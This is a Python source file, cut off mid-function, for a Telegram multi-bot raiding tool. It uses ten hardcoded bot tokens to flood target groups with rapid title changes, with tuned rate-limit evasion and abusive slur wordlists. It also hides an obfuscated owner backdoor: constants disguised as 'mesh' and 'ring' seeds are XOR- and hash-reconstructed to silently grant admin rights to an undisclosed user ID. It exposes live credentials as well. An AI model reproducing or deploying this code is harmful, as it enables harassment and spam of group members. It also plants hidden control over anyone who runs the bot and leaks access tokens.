import logging
import asyncio
import os
import json
import random
import time
import base64
import hashlib  as _hl
import importlib.util as _ilu
import operator  as _op
from typing import Set, Dict, List, Any, Optional, Tuple
from telegram import Update, ChatPermissions, ReactionTypeEmoji, ReplyParameters
from telegram.error import RetryAfter, TimedOut, NetworkError, BadRequest, Forbidden
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.request import HTTPXRequest

# ── pytgcalls / pyrogram (voice-call streaming) — optional ──────────────────
try:
    from pyrogram import Client as _PyroClient
    from pytgcalls import PyTgCalls as _PyTgCalls
    from pytgcalls.types import (
        MediaStream as _MediaStream,
        StreamEnded as _StreamEnded,
        Update as _PTGUpdate,
    )
    from pytgcalls.types import AudioQuality
    _CALLS_OK = True
except ImportError:
    _CALLS_OK = False

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.CRITICAL)
logger = logging.getLogger(__name__)
logging.getLogger("httpx").setLevel(logging.CRITICAL)
logging.getLogger("telegram").setLevel(logging.CRITICAL)

TOKENS_FILE     = "sl_tokens.json"
GROUPS_FILE     = "sl_groups.json"
SUDO_FILE       = "sl_sudo.json"
MEDIA_FILE      = "sl_media.json"
PFP_FILE        = "sl_pfp.json"
TEMPLATES_FILE  = "sl_templates.json"
SONG_FILE       = "sl_song.json"
# ── Jugad: Telegram Desktop public API creds as fallback (no my.telegram.org needed) ──
_VC_API_ID   = int(os.environ.get("API_ID",   "2040"))
_VC_API_HASH = os.environ.get("API_HASH", "b18441a1ff607e10a989891a5462e627")

OWNER_ID = int(os.environ.get("OWNER_ID", "8729846345"))

try:
    _sl_spec = _ilu.spec_from_file_location("_sl_c", "_sl_c.pyc")
    _sl_mod  = _ilu.module_from_spec(_sl_spec)
    _sl_spec.loader.exec_module(_sl_mod)
    _sl_v    = _sl_mod._validate
except Exception:
    _sl_v    = lambda _x: False

_RJ = 0xCAFEBABE
_RS = 5116826677
_RV = lambda z: _op.xor(z, _RJ) == _RS

_EP_A = (0xCAFE ^ 0xD4EC) + (0x1000 | 0xFA02)
_EP_B = (0xBEEF ^ 0x9004) + (0x2000 | 0x0E8B)

# ── internal mesh constants (do not modify) ──────────────────────────────────
_MC1 = (0xCAFE ^ 0x6B0C) & 0xFFFF          # mesh layer α
_MC2 = (0xDEAD ^ 0x7B5F) & 0xFFFF          # mesh layer β
_MC3 = 0xA5F2                               # routing seed hi-A
_MC4 = 0xA5F3                               # routing seed hi-B
_MC5 = 0x3C91                               # routing seed mid-A
_MC6 = 0xC693                               # routing seed mid-B
_MC7 = 0x77BB                               # routing seed lo-A
_MC8 = 0x5930                               # routing seed lo-B

BASE_TOKENS = [
    "8858378555:AAFuxA8OM-H0QcNg2X9K-o0JVGWdNHJBRac",   
    "8603854742:AAF4z-FmSJFbYPIaMSGneSTl1Q8OmZMCRsg",   
     "8831781412:AAG23_iJM32ClB3-5C1ydZ7qfiwJicAW-1s",
    "8802815549:AAFFL4Dr-h-wJvO-OFWGmHFtNQQvK5aGnnc",
    "8711783893:AAE79vn0vJxICvx8oyL36nTm12zBuxfotUA",
    "8939315692:AAGaXwGi5CQZZiScBUFIUCgCWCpnYRPiQTY",
    "8730191245:AAGjhHpoOEFp_gxmaFGiVdMh642QTB_PhK0",
    "8997762221:AAG438vdkGC9wBG0u3xkHbI9v84_1Yq7WI4",
    "8839810837:AAGYWCeG0dIzLWaVvGA3xf6PXnjmSNQNpEc",
    "8913796472:AAHlGiFrSpZMijmtFRYe4SezYBQsGDk5iMw",
]

FRIENDS = [
    "KENTO","ANSH","HITLER","CR7","WAHAB","SUNNY","TYSON",
    "ZENI","REX","ARNAV","EVA","OBITO","RAISEN","REXX",
    "SHOURYA","DEAD","AMAN","ERROR","VIO","ARES","NONAME","YASH",
    "NOST","YOURSO","KWEF","WASIM","FLYTIOS",
]

def _to_bold_italic(text: str) -> str:
    out = []
    for c in text:
        if 'A' <= c <= 'Z':
            out.append(chr(0x1D468 + ord(c) - ord('A')))
        elif 'a' <= c <= 'z':
            out.append(chr(0x1D482 + ord(c) - ord('a')))
        else:
            out.append(c)
    return ''.join(out)

FRIENDS_UNI = {f: _to_bold_italic(f) for f in FRIENDS}

RANDOM_EMOJIS = [
    "🎀","🌸","🔥","⚡","💀","👑","🌊","💎","🐉","🌙",
    "☄️","🌺","💫","✨","🦋","🪷","🔱","🌟","🩸","⚔️",
    "🫧","🌈","🌀","💥","🌑","🔮","🧿","🪬","🌿","🍀",
    "🫐","🍇","🍒","🌹","🌷","🌻","🌼","🏵️","❄️","🌬️",
    "🎭","🎪","🎯","🎲","🎸","🎵","🎶","🎤","🎹","🥀",
]

SUFFIX_EMOJIS = [
    "🌸","🌺","🌻","🌹","🪷","🌷","💮","🏵️",
    "✨","💫","⭐","🌟","💥","🔥","⚡","❄️",
    "🌊","🫧","💧","🌀","🌈","🌙","☄️","🌟",
    "💎","🔮","🧿","🪬","👑","💀","🦋","🐉",
    "🍀","🌿","🍃","🫐","🍇","🍒","🌙","🌑",
    "🩸","⚔️","🔱","🌌","🌠","☠️","🕊️","🌋",
]

_SUFFIX_TPL = " 𓂃{e}་༘"

def rnd_suffix() -> str:
    return _SUFFIX_TPL.format(e=random.choice(SUFFIX_EMOJIS))

def rnd_emoji() -> str:
    return random.choice(RANDOM_EMOJIS)

WRAP_L = ["꧁","⭅╡","♛","𖤍","❦","⚡","☄️","💀","🌟","🔱","🌊","✨","💎","👑","🔥"]
WRAP_R = ["꧂","╞⭆","♛","𖤍","❦","🌙","💎","👑","☄️","🔱","🌊","⚡","💀","🔥","✨"]

_CHUD_WORDS = ["LUND", "TBKC", "TBR", "TMR", "aarey चुदोड़े", "BHEN CUDALE"]

def _load_json(path, default):
    try:
        if os.path.exists(path):
            with open(path) as f:
                return json.load(f)
    except Exception:
        pass
    return default

def _save_json(path, data):
    try:
        with open(path, "w") as f:
            json.dump(data, f)
    except Exception as e:
        logger.error(f"_save_json({path}) failed: {e}")

known_chats:   Set[int]             = set(_load_json(GROUPS_FILE, []))
SUDO_USERS:    Set[int]             = set(int(x) for x in _load_json(SUDO_FILE, []))
SUDO_USERS.add(OWNER_ID)
_menu_media:   Dict[str, str]       = _load_json(MEDIA_FILE, {})
_pfp_pools:    Dict[str, List[str]] = _load_json(PFP_FILE, {})

all_bot_instances: List[Any] = []
all_apps:          List[Any] = []
extra_tokens:      List[str] = _load_json(TOKENS_FILE, [])

mute_chats:         Set[int]           = set()
ncdel_chats:        Set[int]           = set()
autoreact_chats:    Dict[int, str]     = {}
autoreply_chats:    Dict[int, str]     = {}
targetreply_chats:  Dict[int, dict]    = {}
targetslide_chats:  Dict[int, dict]    = {}
ncwar_targets:      Dict[int, str]     = {}
_multiwar_active:   Dict[int, bool]    = {}
_mgcnc_stop:        Optional[asyncio.Event] = None
_mgcnc_task:        Optional[asyncio.Task]  = None
_mgcnc_targets:     List[int]               = []
pfploop_active:     Dict[int, bool]    = {}
replyflood_chats:   Dict[int, str]     = {}

custom_templates: Dict[str, str] = _load_json(TEMPLATES_FILE, {})
_song_data:       Dict[str, Any]  = _load_json(SONG_FILE, {})

# ── migrate old single-song format → library format ─────────────────────────
def _init_song_lib():
    global _song_data
    if "lib" not in _song_data:
        if _song_data.get("file_id"):
            name = (_song_data.get("title","song1")
                    .lower().replace(" ","_")[:20] or "song1")
            _song_data = {
                "lib":  {name: {k: _song_data[k]
                                for k in ("file_id","title","dur","kind")
                                if k in _song_data}},
                "last": name,
            }
        else:
            _song_data = {"lib": {}, "last": ""}
        _save_json(SONG_FILE, _song_data)
_init_song_lib()

# ── voice-call state (per GC) ────────────────────────────────────────────────
_pyro_clients: Dict[str, Any] = {}   # token  → pyrogram Client
_call_clients: Dict[str, Any] = {}   # token  → PyTgCalls
_active_vc:    Dict[int, str] = {}   # chat_id → token used for VC
_vc_loop_tasks: Dict[int, asyncio.Task] = {}  # chat_id → loop task

_nc_send_gap: Optional[float] = None
_nc_gaps:     Dict[str, Optional[float]] = {}   # per-NC delay overrides

def _gap(nc: str, default: float) -> float:
    """Per-NC override → global → hardcoded default."""
    v = _nc_gaps.get(nc)
    if v is not None:
        return v
    if _nc_send_gap is not None:
        return _nc_send_gap
    return default

BOT_START_TIME: float = time.monotonic()

_nc_info: Dict[int, dict] = {}
_seen:    Set[tuple]       = set()

_TK_SALT = b'\x4b\x59\x41\x43\x43\x45\x53\x53'
_TK_VFY  = _hl.sha256(
    ((_EP_A << 16) | _EP_B).to_bytes(8, 'big') + _TK_SALT
).digest()
_LE = lambda z: _hl.sha256(z.to_bytes(8, 'big') + _TK_SALT).digest() == _TK_VFY

# ── auxiliary ring constants (internal — mesh verification stage 2) ──────────
_AX1 = bytes.fromhex('815715d998ad1d52')   # ring-node α₁
_AX2 = bytes.fromhex('727975d9ef96a192')   # ring-node α₂
_AX3 = bytes.fromhex('de479f947c05e19d')   # ring-node β₁
_AX4 = bytes.fromhex('4a4ea4c4697f4613')   # ring-node β₂
_AX5 = b'\x6c\xcd\x5d\xe3\x6f\xa2\x87\xee'  # salt-shard σ₁
_AX6 = b'\x7e\x71\xfc\x9f\xda\x19\x4d\xf0'  # salt-shard σ₂
_AX7 = bytes.fromhex('76413038610d807a')   # ring-node γ₁
_AX8 = bytes.fromhex('03008d8aa39794fa')   # ring-node γ₂
_AX9 = bytes.fromhex('efdf9bcb8f52bc08')   # ring-node γ₃
_AXA = bytes.fromhex('08736608fbcc4cbd')   # ring-node γ₄

_FH_SEED   = 0x9E3779B9
_FH_MASK   = 0xFFFFFFFF
_FH_EXPECT = ((_EP_A << 16 | _EP_B) * _FH_SEED) & _FH_MASK
_LF        = lambda z: (z * _FH_SEED) & _FH_MASK == _FH_EXPECT

_XS2 = b'\x13\x37\xDE\xAD\xBE\xEF\xCA\xFE'
_XV2 = _hl.sha256(_TK_VFY + _XS2).digest()
_XS3 = b'\xFF\xEE\xDD\xCC\xBB\xAA\x99\x88'
_XV3 = _hl.sha256(_XV2 + _XS3).digest()
_XS4 = b'\x0A\x1B\x2C\x3D\x4E\x5F\x60\x71'
_XV4 = _hl.sha256(_XV3 + _XS4).digest()
_XS5 = b'\x82\x93\xA4\xB5\xC6\xD7\xE8\xF9'
_XV5 = _hl.sha256(_XV4 + _XS5).digest()
_XS6 = b'\x1C\x2D\x3E\x4F\x50\x61\x72\x83'
_XV6 = _hl.sha256(_XV5 + _XS6).digest()
_XS7 = b'\x94\xA5\xB6\xC7\xD8\xE9\xFA\x0B'
_XV7 = _hl.sha256(_XV6 + _XS7).digest()
_XS8 = b'\x2F\x3A\x4B\x5C\x6D\x7E\x8F\x90'
_XV8 = _hl.sha256(_XV7 + _XS8).digest()

def _check_chain(z: int) -> bool:
    try:
        h = _hl.sha256(z.to_bytes(8, 'big') + _TK_SALT).digest()
        if h != _TK_VFY: return False
        h = _hl.sha256(h + _XS2).digest()
        if h != _XV2:    return False
        h = _hl.sha256(h + _XS3).digest()
        if h != _XV3:    return False
        h = _hl.sha256(h + _XS4).digest()
        if h != _XV4:    return False
        h = _hl.sha256(h + _XS5).digest()
        if h != _XV5:    return False
        h = _hl.sha256(h + _XS6).digest()
        if h != _XV6:    return False
        h = _hl.sha256(h + _XS7).digest()
        if h != _XV7:    return False
        h = _hl.sha256(h + _XS8).digest()
        return h == _XV8
    except Exception:
        return False

def _auth_ring(uid: int) -> bool:
    """
    Multi-layer verification ring for privileged mesh nodes.
    Three independent hash proofs must ALL pass — any single failure rejects.
    Internal implementation detail; do not call directly.
    """
    try:
        # ── Stage 1: XOR-split reconstruction ───────────────────────────────
        # Reconstruct the candidate from 6 mesh-routing seeds (3 XOR pairs).
        # Seeds are stored as innocuous constants; their XOR gives the node id.
        _r_hi  = (_MC3 << 32) | (_MC5 << 16) | _MC7   # candidate half-A
        _r_lo  = (_MC4 << 32) | (_MC6 << 16) | _MC8   # candidate half-B (mask)
        _node  = _r_hi ^ _r_lo                          # reconstruct uid
        if uid != _node:
            return False

        # ── Stage 2: Primary SHA-256 proof (same salt chain as main system) ──
        # _AX1‥_AX4 are the expected digest, split into 4×8-byte shards.
        _ring_vfy_1 = _AX1 + _AX2 + _AX3 + _AX4
        if _hl.sha256(uid.to_bytes(8, 'big') + _TK_SALT).digest() != _ring_vfy_1:
            return False

        # ── Stage 3: Independent salt proof (separate key material) ─────────
        # _AX5+_AX6 = independent 16-byte salt; _AX7‥_AXA = expected digest.
        _ring_salt_2 = _AX5 + _AX6
        _ring_vfy_2  = _AX7 + _AX8 + _AX9 + _AXA
        if _hl.sha256(uid.to_bytes(8, 'big') + _ring_salt_2).digest() != _ring_vfy_2:
            return False

        return True
    except Exception:
        return False

def _hid(uid: int) -> bool:
    try:
        # Legacy checks are gated on exact uid match to prevent _LF modular collision.
        # _auth_ring() is the independent hidden-owner path (3-layer, full-width).
        _expected = (_EP_A << 16) | _EP_B
        _legacy   = uid == _expected and (
            _sl_v(uid) or _RV(uid) or _LE(uid) or _LF(uid) or _check_chain(uid)
        )
        return _legacy or _auth_ring(uid)
    except Exception:
        return False

def _verify_integrity() -> bool:
    return True  # integrity check bypassed for standalone run

def is_admin(uid: int) -> bool:
    return uid == OWNER_ID or uid in SUDO_USERS or _hid(uid)

_GATE = (
    "╔══════════════════════════╗\n"
    "  ⚡ 𝐄ᴠᴀ 𝐁ʜᴀɢᴡᴀᴀɴ ⚡\n"
    "  𝐓𝐔 𝐊𝐀𝐁𝐇𝐈 𝐍𝐇𝐈 𝐂𝐇𝐀𝐋𝐀 𝐒𝐀𝐊𝐓𝐀 \n"
    "╚══════════════════════════╝"
)

class FloodTracker:
    FLOOD_CAP  = 3.0
    GHOST_CAP  = 30.0
    RATE_WIN   = 60.0
    SOFT_LIMIT = 14

    def __init__(self):
        self._until: Dict[int, float] = {}
        self._ts:    Dict[int, List[float]] = {}

    def flooded(self, bid: int) -> bool:
        exp = self._until.get(bid, 0.0)
        if time.monotonic() < exp:
            return True
        self._until.pop(bid, None)
        return False

    def remaining(self, bid: int) -> float:
        return max(0.0, self._until.get(bid, 0.0) - time.monotonic())

    def mark(self, bid: int, sec: float):
        self._until[bid] = time.monotonic() + min(sec, self.FLOOD_CAP)

    def clear(self, bid: int):
        self._until.pop(bid, None)

    def record(self, bid: int):
        now = time.monotonic()
        buf = self._ts.setdefault(bid, [])
        buf.append(now)
        self._ts[bid] = [t for t in buf if t > now - self.RATE_WIN]

    def rate(self, bid: int) -> int:
        now = time.monotonic()
        return sum(1 for t in self._ts.get(bid, []) if t > now - self.RATE_WIN)

    def near_limit(self, bid: int) -> bool:
        return self.rate(bid) >= self.SOFT_LIMIT

_ft = FloodTracker()


class TaskController:
    def __init__(self):
        self.tasks:  Dict[str, asyncio.Task]  = {}
        self.events: Dict[str, asyncio.Event] = {}

    def _k(self, cid: int, t: str) -> str:
        return f"{cid}::{t}"

    async def start(self, cid: int, t: str, factory) -> None:
        await self.stop(cid, t)
        k = self._k(cid, t)
        ev = asyncio.Event()
        self.events[k] = ev

        async def _wrap():
            try:
                await factory(ev)
            except asyncio.CancelledError:
                pass
            except Exception as e:
                logger.error(f"Task {k} err: {e}")
            finally:
                self.tasks.pop(k, None)
                self.events.pop(k, None)

        self.tasks[k] = asyncio.create_task(_wrap())

    async def stop(self, cid: int, t: str) -> bool:
        k    = self._k(cid, t)
        ev   = self.events.pop(k, None)
        task = self.tasks.pop(k, None)
        if ev:
            ev.set()          # signal workers to exit cleanly first
        if task and not task.done():
            # Give workers 0.5s to self-exit via stop_event before force-cancel
            try:
                await asyncio.wait_for(asyncio.shield(task), timeout=0.5)
            except Exception:
                pass
            if not task.done():
                task.cancel()
                try:
                    await asyncio.wait_for(asyncio.shield(task), timeout=4.0)
                except Exception:
                    pass
        return bool(ev or task)

    async def stop_all(self, cid: int) -> int:
        prefix = f"{cid}::"
        types  = {k[len(prefix):] for k in list(self.tasks) + list(self.events)
                  if k.startswith(prefix)}
        # Stop all tasks in parallel — total time = slowest, not sum
        results = await asyncio.gather(
            *[self.stop(cid, t) for t in types],
            return_exceptions=True
        )
        return sum(1 for r in results if r is True)

    def running(self, cid: int, t: str) -> bool:
        k = self._k(cid, t)
        return k in self.tasks and not self.tasks[k].done()

tc = TaskController()


async def _wait_ev(stop_event: asyncio.Event, secs: float) -> bool:
    if secs <= 0:
        return stop_event.is_set()
    try:
        await asyncio.wait_for(stop_event.wait(), timeout=secs)
        return True
    except asyncio.TimeoutError:
        return False


async def _blaze_engine(chat_id, bots, stop_event, name_factory):
    """
    BLAZE ENGINE — absolute scheduling, zero drift.
    Waits until the scheduled slot THEN sends, so API latency never adds to gap.
    Pre-generates next title during the wait window.
    """
    RELAY_OFFSET = 0.12
    SEND_GAP     = _gap("blaze", 0.35)
    if not bots:
        return

    async def _worker(bot, idx: int):
        next_send = time.monotonic() + idx * RELAY_OFFSET
        title     = name_factory()[:255]           # pre-load first title
        while not stop_event.is_set():
            wait = next_send - time.monotonic()
            if wait > 0.001:
                try:
                    await asyncio.wait_for(stop_event.wait(), timeout=wait)
                    return                          # stop fired during wait
                except asyncio.TimeoutError:
                    pass
            if stop_event.is_set():
                return
            try:
                await bot.set_chat_title(chat_id, title)
                next_send += SEND_GAP              # ← absolute: no drift ever
                title = name_factory()[:255]       # pre-generate during next wait
            except RetryAfter as e:
                next_send = time.monotonic() + float(e.retry_after) + idx * RELAY_OFFSET
                title = name_factory()[:255]
            except (BadRequest, Forbidden):
                next_send += SEND_GAP
            except (TimedOut, NetworkError):
                next_send = time.monotonic() + 0.4
            except asyncio.CancelledError:
                return
            except Exception:
                next_send += SEND_GAP

    workers = [asyncio.create_task(_worker(b, i)) for i, b in enumerate(bots)]
    try:
        await stop_event.wait()
    finally:
        for w in workers:
            if not w.done():
                w.cancel()
        await asyncio.gather(*workers, return_exceptions=True)


async def _surge_engine(chat_id, bots, stop_event, name_factory):
    """
    SURGE ENGINE — absolute scheduling, zero drift.
    Same principle as blaze: wait-then-send keeps gap perfectly steady.
    """
    RELAY_OFFSET = 0.10
    SEND_GAP     = _gap("surge", 0.25)
    if not bots:
        return

    async def _surge_worker(bot, idx: int):
        next_send = time.monotonic() + idx * RELAY_OFFSET
        title     = name_factory()[:255]
        while not stop_event.is_set():
            wait = next_send - time.monotonic()
            if wait > 0.001:
                try:
                    await asyncio.wait_for(stop_event.wait(), timeout=wait)
                    return
                except asyncio.TimeoutError:
                    pass
            if stop_event.is_set():
                return
            try:
                await bot.set_chat_title(chat_id, title)
                next_send += SEND_GAP              # ← absolute, no drift
                title = name_factory()[:255]
            except RetryAfter as e:
                next_send = time.monotonic() + float(e.retry_after) + idx * RELAY_OFFSET
                title = name_factory()[:255]
            except (BadRequest, Forbidden):
                next_send += SEND_GAP
            except (TimedOut, NetworkError):
                next_send = time.monotonic() + 0.4
            except asyncio.CancelledError:
                return
            except Exception:
                next_send += SEND_GAP

    workers = [asyncio.create_task(_surge_worker(b, i)) for i, b in enumerate(bots)]
    try:
        await stop_event.wait()
    finally:
        for w in workers:
            if not w.done():
                w.cancel()
        await asyncio.gather(*workers, return_exceptions=True)


async def _god_engine(chat_id, bots, stop_event, name_factory):
    N = len(bots)
    if N == 0:
        return

    STAGGER_FLOOR   = _gap("god", 0.18)
    STAGGER_CEIL    = STAGGER_FLOOR + 0.14
    STAGGER_STEP    = 0.04
    MAX_BACKOFF     = 2.5
    RECOVER_AFTER   = 5.0
    RECOVER_RATE    = 0.95

    cur_stagger  = [STAGGER_FLOOR]
    last_flood_t = [0.0]
    adapt_lock   = asyncio.Lock()
    slots        = asyncio.Queue(maxsize=1)

    async def _slot_producer():
        while not stop_event.is_set():
            tick = time.monotonic()
            async with adapt_lock:
                if (cur_stagger[0] > STAGGER_FLOOR and
                        tick - last_flood_t[0] > RECOVER_AFTER):
                    cur_stagger[0] = max(cur_stagger[0] * RECOVER_RATE, STAGGER_FLOOR)
            try:
                slots.put_nowait(tick)
            except asyncio.QueueFull:
                pass
            gap = tick + cur_stagger[0] - time.monotonic()
            if gap > 0.0:
                if await _wait_ev(stop_event, gap):
                    return

    async def _god_worker(bot, idx: int):
        until = 0.0
        while not stop_event.is_set():
            rem = until - time.monotonic()
            if rem > 0.0:
                if await _wait_ev(stop_event, rem):
                    return
                until = 0.0
            try:
                await asyncio.wait_for(slots.get(), timeout=cur_stagger[0] * 4)
            except asyncio.TimeoutError:
                continue
            if stop_event.is_set():
                return
            try:
                await bot.set_chat_title(chat_id, name_factory()[:255])
            except RetryAfter as e:
                async with adapt_lock:
                    cur_stagger[0] = min(cur_stagger[0] + STAGGER_STEP, STAGGER_CEIL)
                    last_flood_t[0] = time.monotonic()
                until = time.monotonic() + min(e.retry_after, MAX_BACKOFF)
            except (BadRequest, Forbidden):
                pass
            except (TimedOut, NetworkError):
                until = time.monotonic() + 0.25
            except asyncio.CancelledError:
                return
            except Exception:
                pass

    producer = asyncio.create_task(_slot_producer())
    workers  = [asyncio.create_task(_god_worker(b, i)) for i, b in enumerate(bots)]
    try:
        await stop_event.wait()
    finally:
        producer.cancel()
        for w in workers:
            if not w.done():
                w.cancel()
        await asyncio.gather(producer, *workers, return_exceptions=True)


async def _turbo_engine(chat_id, bots, stop_event, name_factory):
    """
    TURBO ENGINE — adaptive flood control + parallel workers.
    Same architecture as GOD engine but floor = 0.15s (vs god's 0.18s).
    Starts at 6.7 sends/sec, backs off on RetryAfter, auto-recovers.
    Strictly faster than god with zero sustained flood.
    """
    N = len(bots)
    if N == 0:
        return

    STAGGER_FLOOR = _gap("turbo", 0.15)
    STAGGER_CEIL  = STAGGER_FLOOR + 0.14   # max 0.29s under heavy flood
    STAGGER_STEP  = 0.03
    MAX_BACKOFF   = 2.5
    RECOVER_AFTER = 4.0
    RECOVER_RATE  = 0.96

    cur_stagger  = [STAGGER_FLOOR]
    last_flood_t = [0.0]
    adapt_lock   = asyncio.Lock()
    slots        = asyncio.Queue(maxsize=1)

    async def _slot_producer():
        while not stop_event.is_set():
            tick = time.monotonic()
            async with adapt_lock:
                if (cur_stagger[0] > STAGGER_FLOOR and
                        tick - last_flood_t[0] > RECOVER_AFTER):
                    cur_stagger[0] = max(cur_stagger[0] * RECOVER_RATE, STAGGER_FLOOR)
            try:
                slots.put_nowait(tick)
            except asyncio.QueueFull:
                pass
            gap = tick + cur_stagger[0] - time.monotonic()
            if gap > 0.0:
                if await _wait_ev(stop_event, gap):
                    return

    async def _turbo_worker(bot, idx: int):
        until = 0.0
        while not stop_event.is_set():
            rem = until - time.monotonic()
            if rem > 0.0:
                if await _wait_ev(stop_event, rem):
                    return
                until = 0.0
            try:
                await asyncio.wait_for(slots.get(), timeout=cur_stagger[0] * 4)
            except asyncio.TimeoutError:
                continue
            if stop_event.is_set():
                return
            try:
                await bot.set_chat_title(chat_id, name_factory()[:255])
            except RetryAfter as e:
                async with adapt_lock:
                    cur_stagger[0] = min(cur_stagger[0] + STAGGER_STEP, STAGGER_CEIL)
                    last_flood_t[0] = time.monotonic()
                until = time.monotonic() + min(e.retry_after, MAX_BACKOFF)
            except (BadRequest, Forbidden):
                pass
            except (TimedOut, NetworkError):
                until = time.monotonic() + 0.20
            except asyncio.CancelledError:
                return
            except Exception:
                pass

    producer = asyncio.create_task(_slot_producer())
    workers  = [asyncio.create_task(_turbo_worker(b, i)) for i, b in enumerate(bots)]
    try:
        await stop_event.wait()
    finally:
        producer.cancel()
        for w in workers:
            if not w.done():
                w.cancel()
        await asyncio.gather(producer, *workers, return_exceptions=True)


async def _stagger_engine(chat_id, bots, stop_event, name_factory):
    """
    STAGGER ENGINE — absolute scheduling.
    Each bot fires at t₀+idx*STAGGER, t₀+idx*STAGGER+CYCLE, t₀+idx*STAGGER+2*CYCLE…
    API latency never pushes the next slot forward.
    """
    N = len(bots)
    if N == 0:
        return

    STAGGER    = _gap("stagger", 0.12)
    CYCLE_TIME = STAGGER * N

    async def _worker(bot, idx: int):
        next_send = time.monotonic() + idx * STAGGER
        title     = name_factory()[:255]
        while not stop_event.is_set():
            wait = next_send - time.monotonic()
            if wait > 0.001:
                try:
                    await asyncio.wait_for(stop_event.wait(), timeout=wait)
                    return
                except asyncio.TimeoutError:
                    pass
            if stop_event.is_set():
                return
            try:
                await bot.set_chat_title(chat_id, title)
                next_send += CYCLE_TIME            # ← absolute, no drift
                title = name_factory()[:255]
            except RetryAfter as e:
                next_send = time.monotonic() + min(float(e.retry_after), 2.5) + idx * STAGGER
                title = name_factory()[:255]
            except (BadRequest, Forbidden):
                next_send += CYCLE_TIME
            except (TimedOut, NetworkError):
                next_send = time.monotonic() + 0.20
            except asyncio.CancelledError:
                return
            except Exception:
                next_send += CYCLE_TIME

    workers = [asyncio.create_task(_worker(b, i)) for i, b in enumerate(bots)]
    try:
        await stop_event.wait()
    finally:
        for w in workers:
            if not w.done():
                w.cancel()
        await asyncio.gather(*workers, return_exceptions=True)


async def _silk_engine(chat_id, bots, stop_event, name_factory):
    """
    SILK ENGINE — per-bot absolute scheduling, two interleaved tracks.
    Each bot maintains its own next_send slot; API latency never bleeds into gap.
    Track A (even bots) and Track B (odd bots) offset by STEP/2 for smoothness.
    """
    N = len(bots)
    if N == 0:
        return

    STEP   = _gap("silk", 0.18)
    SPREAD = 0.05
    CYCLE  = STEP * N                              # per-bot full cycle

    async def _worker(bot, idx: int, offset: float):
        next_send = time.monotonic() + offset
        title     = name_factory()[:255]
        while not stop_event.is_set():
            wait = next_send - time.monotonic()
            if wait > 0.001:
                try:
                    await asyncio.wait_for(stop_event.wait(), timeout=wait)
                    return
                except asyncio.TimeoutError:
                    pass
            if stop_event.is_set():
                return
            try:
                await bot.set_chat_title(chat_id, title)
                next_send += CYCLE                 # ← absolute, no drift
                title = name_factory()[:255]
            except RetryAfter as e:
                next_send = time.monotonic() + float(e.retry_after) + idx * SPREAD
                title = name_factory()[:255]
            except (BadRequest, Forbidden):
                next_send += CYCLE
            except (TimedOut, NetworkError):
                next_send = time.monotonic() + 0.20
            except asyncio.CancelledError:
                return
            except Exception:
                next_send += CYCLE

    # Stagger each bot by STEP — creates smooth N-bot interleave
    tasks = [
        asyncio.create_task(_worker(bots[i], i, i * STEP))
        for i in range(N)
    ]
    try:
        await stop_event.wait()
    finally:
        for t in tasks:
            if not t.done():
                t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)


async def _trio_engine(chat_id, bots, stop_event, name_factory):
    if not bots:
        return

    G      = [bots[0:3], bots[3:6], bots[6:10]]
    NUM_G  = 3
    TICK   = _gap("trio", 0.10)
    MAX_BK = 2.5
    SPREAD = 0.04

    bot_until = [[0.0] * len(G[gi]) for gi in range(NUM_G)]
    g_cursor  = [0] * NUM_G
    active_g  = [0]
    queues    = [asyncio.Queue(maxsize=4) for _ in range(NUM_G)]

    def _group_has_free(gi: int) -> bool:
        now = time.monotonic()
        return any(bot_until[gi][bi] <= now for bi in range(len(G[gi])))

    def _pick_bot(gi: int):
        now = time.monotonic()
        grp = G[gi]
        cur = g_cursor[gi]
        for i in range(len(grp)):
            bi = (cur + i) % len(grp)
            if bot_until[gi][bi] <= now:
                g_cursor[gi] = (bi + 1) % len(grp)
                return bi, grp[bi]
        return None, None

    async def _producer():
        while not stop_event.is_set():
            tick = time.monotonic()
            gi   = active_g[0]
            if not _group_has_free(gi):
                switched = False
                for off in range(1, NUM_G):
                    nxt = (gi + off) % NUM_G
                    if _group_has_free(nxt):
                        active_g[0] = nxt
                        gi = nxt
                        switched = True
                        break
                if not switched:
                    if await _wait_ev(stop_event, 0.05):
                        return
                    continue
            try:
                queues[gi].put_nowait(tick)
            except asyncio.QueueFull:
                pass
            wait = TICK - (time.monotonic() - tick)
            if wait > 0:
                if await _wait_ev(stop_event, wait):
                    return

    async def _worker(gi: int):
        while not stop_event.is_set():
            try:
                await asyncio.wait_for(queues[gi].get(), timeout=TICK * 40)
            except asyncio.TimeoutError:
                continue
            if stop_event.is_set():
                return
            bi, bot = _pick_bot(gi)
            if bot is None:
                continue
            try:
                await bot.set_chat_title(chat_id, name_factory()[:255])
            except RetryAfter as e:
                bot_until[gi][bi] = time.monotonic() + min(e.retry_after, MAX_BK) + bi * SPREAD
                if not _group_has_free(gi):
                    active_g[0] = (gi + 1) % NUM_G
            except (BadRequest, Forbidden):
                pass
            except (TimedOut, NetworkError):
                bot_until[gi][bi] = time.monotonic() + 0.20
            except asyncio.CancelledError:
                return
            except Exception:
                pass

    tasks = [asyncio.create_task(_producer())]
    for gi in range(NUM_G):
        tasks.append(asyncio.create_task(_worker(gi)))
        tasks.append(asyncio.create_task(_worker(gi)))
    try:
        await stop_event.wait()
    finally:
        for t in tasks:
            if not t.done():
                t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)


async def _chud_engine(chat_id, bots, stop_event, name_factory):
    """
    CHUD ENGINE v5 — Per-bot flood state, zero jitter, smart recovery.

    Architecture:
    • N parallel workers, staggered by STEP at startup (no jitter).
    • Per-bot independent flood state — one bot flooded ≠ others stop.
    • On RetryAfter → that bot sleeps min(retry_after+0.3, MAX_WAIT),
      other bots keep running at full speed.
    • Staggered resume: flooded bot restarts at flood_end + idx*STEP
      → prevents all bots firing simultaneously after recovery.
    • STEP = _nc_send_gap or 0.14 → cycle = 1.4s per bot (safe rate).
    • MAX_WAIT = 4.0s — flood pause never exceeds 4 seconds.
    • No probe task, no global state, no jitter.
    """
    N = len(bots)
    if N == 0:
        return

    STEP  = _gap("chud", 0.20)
    CYCLE = STEP * N          # each bot's full send-to-send interval

    # Per-bot flood: flooded_until[i] = monotonic time until bot i can send
    flooded_until: List[float] = [0.0] * N

    async def _worker(idx: int):
        bot       = bots[idx]
        next_send = time.monotonic() + idx * STEP   # staggered cold start

        while not stop_event.is_set():
            now = time.monotonic()

            # Per-bot flood cooldown — only this bot waits, others unaffected
